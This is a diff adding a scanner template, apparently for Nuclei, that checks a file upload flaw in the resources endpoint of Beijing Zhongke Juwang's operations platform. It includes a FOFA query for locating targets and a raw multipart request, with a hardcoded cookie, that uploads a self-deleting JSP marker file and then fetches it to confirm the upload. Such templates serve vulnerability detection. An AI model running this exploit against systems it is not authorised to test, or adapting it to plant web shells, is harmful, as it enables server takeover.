@@ -1,0 +1,44 @@
+id: zhongke-juwang-platform-resources-file-upload
+
+info:
+  name: "北京中科聚网一体化运营平台 resources 接口文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="一体化运营平台" || body="thirdparty/ueditor/WordPaster"
+      北京中科聚网信息技术有限公司开发的一体化运营平台在 resources 接口处理逻辑中存在文件上传权限控制缺陷。攻击者可利用该漏洞上传恶意文件（如后门、Web Shell等），从而实现对服务器的未授权访问或执行任意代码，导致系统被完全控制。
+  tags: 北京中科聚网一体化运营平台
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /resources/files/ue/word HTTP/1.1
+    Host: {{Hostname}}
+    Cookie:  JSESSIONID=9438c497-92ad-4800-b821-20602adec4ac; rememberMe=DQcKKIuzT47bdNWUqrwbm7lus89+rcIV76T4gjLO4SphCJRw6gxullXR9udKkk6i/NG7Uc60WHRESX9EwHokmstMa2I3K9puNySoBrRpTwPiNnHPT/YkOE2GDlu+DQ1gaUbw9GCWuWEB3fW+kigscyqkXJOPO66Y29tLjWQPy5I0B5Fb9guaGXbzLs27Jf0miwE=; 
+    Content-Type: multipart/form-data; boundary=----6fjhygvfu78fhvghkvr7842oibuvbiu
+    Accept-Encoding: gzip, deflate, br
+    Accept: */*
+    Accept-Language: en-US;q=0.9,en;q=0.8
+
+    ------6fjhygvfu78fhvghkvr7842oibuvbiu
+    Content-Disposition: form-data; name="file"; filename="NTest.jsp"
+    Content-Type: application/octet-stream
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------6fjhygvfu78fhvghkvr7842oibuvbiu--
+- raw:
+  - |
+    GET /NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
